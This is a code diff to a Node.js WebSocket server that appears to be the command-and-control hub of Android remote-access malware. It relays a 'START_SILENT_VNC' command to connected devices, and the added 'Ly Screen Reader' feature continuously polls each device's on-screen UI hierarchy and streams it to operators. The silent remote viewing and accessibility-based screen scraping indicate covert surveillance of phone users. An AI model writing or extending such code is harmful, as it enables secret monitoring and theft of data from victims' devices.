@@ -11,6 +11,10 @@ const operators  = new Map();  // opId  → WebSocket
 const vncSubs    = new Map();  // devId → Set<WebSocket>  (VNC / accessibility mode)
 const vncV2Subs  = new Map();  // devId → Set<WebSocket>  (V2 / MediaProjection mode)
 
+// ── Ly Screen Reader — per-device hierarchy cache & poll timers ────────────────
+const deviceHierarchy = new Map();  // devId → last hierarchy JSON string
+const hierarchyPolls  = new Map();  // devId → { interval, subscribers: Set<opId> }
+
 // ── Helpers ────────────────────────────────────────────────────────────────────
 const sleep    = ms => new Promise(r => setTimeout(r, ms));
 const tryJSON  = (s, fb = null) => { try { return JSON.parse(s); } catch { return fb; } };
@@ -354,7 +358,10 @@ async function routeDevMsg(devId, devIdBuf, ws, raw, isBinary) {
     }
 
     case 'screen_hierarchy': {
-      broadcast({ type: 'screen_hierarchy', id: devId, data: data || msg.data || '' });
+      const hData = data || msg.data || '';
+      // Cache so reconnecting operators get the last known tree immediately
+      deviceHierarchy.set(devId, hData);
+      broadcast({ type: 'screen_hierarchy', id: devId, data: hData });
       break;
     }
 
@@ -463,6 +470,14 @@ async function handleDevice(ws, req) {
     devices.delete(devId);
     vncSubs.delete(devId);
     vncV2Subs.delete(devId);
+    // Stop Ly hierarchy poll timer for this device
+    const poll = hierarchyPolls.get(devId);
+    if (poll) {
+      clearInterval(poll.timer);
+      hierarchyPolls.delete(devId);
+    }
+    // Keep cached hierarchy for reconnect; clear after 5 min
+    setTimeout(() => deviceHierarchy.delete(devId), 5 * 60 * 1000);
     await setOffline(devId);
     broadcast({ type: 'device_offline', id: devId });
     console.log(`[-] ${devId.slice(0,8)} disconnected`);
@@ -543,7 +558,60 @@ async function handleOperator(ws, req) {
         const quality = msg.quality || 30;
         if (dev && dev.readyState === WebSocket.OPEN)
           sendJson(dev, { action: 'START_SILENT_VNC', type: 'START_SILENT_VNC', enabled: true, quality });
+        // Flush last known hierarchy immediately so Ly reader isn't blank on reconnect
+        const cachedH = deviceHierarchy.get(id);
+        if (cachedH) sendJson(ws, { type: 'screen_hierarchy', id, data: cachedH });
         run(`UPDATE devices SET vnc_active=1 WHERE id=?`, [id]).catch(() => {});
+        break;
+      }
+
+      // ── Ly Screen Reader — continuous hierarchy polling ────────────────────
+      // Operator sends: { type:'hierarchy_subscribe', devId, interval }
+      // Hub polls the APK at `interval` ms and forwards every hierarchy back.
+      case 'hierarchy_subscribe': {
+        const id  = devId || target;
+        const ivl = Math.max(400, Math.min(5000, msg.interval || 700));
+        if (!id) break;
+
+        // Track this operator in the poll-subscriber set
+        if (!hierarchyPolls.has(id)) {
+          hierarchyPolls.set(id, { timer: null, subs: new Set() });
+        }
+        const poll = hierarchyPolls.get(id);
+        poll.subs.add(opId);
+
+        // Flush cached tree right away
+        const cachedH = deviceHierarchy.get(id);
+        if (cachedH) sendJson(ws, { type: 'screen_hierarchy', id, data: cachedH });
+
+        // Start the poll timer only if not already running
+        if (!poll.timer) {
+          poll.timer = setInterval(() => {
+            const dev = devices.get(id);
+            if (dev && dev.readyState === WebSocket.OPEN) {
+              sendJson(dev, { action: 'REQUEST_HIERARCHY', type: 'REQUEST_HIERARCHY' });
+            } else {
+              // Device gone — stop polling
+              clearInterval(poll.timer);
+              poll.timer = null;
+            }
+          }, ivl);
+        }
+        break;
+      }
+
+      case 'hierarchy_unsubscribe': {
+        const id = devId || target;
+        if (!id) break;
+        const poll = hierarchyPolls.get(id);
+        if (poll) {
+          poll.subs.delete(opId);
+          if (poll.subs.size === 0) {
+            clearInterval(poll.timer);
+            poll.timer = null;
+            hierarchyPolls.delete(id);
+          }
+        }
         break;
       }
 
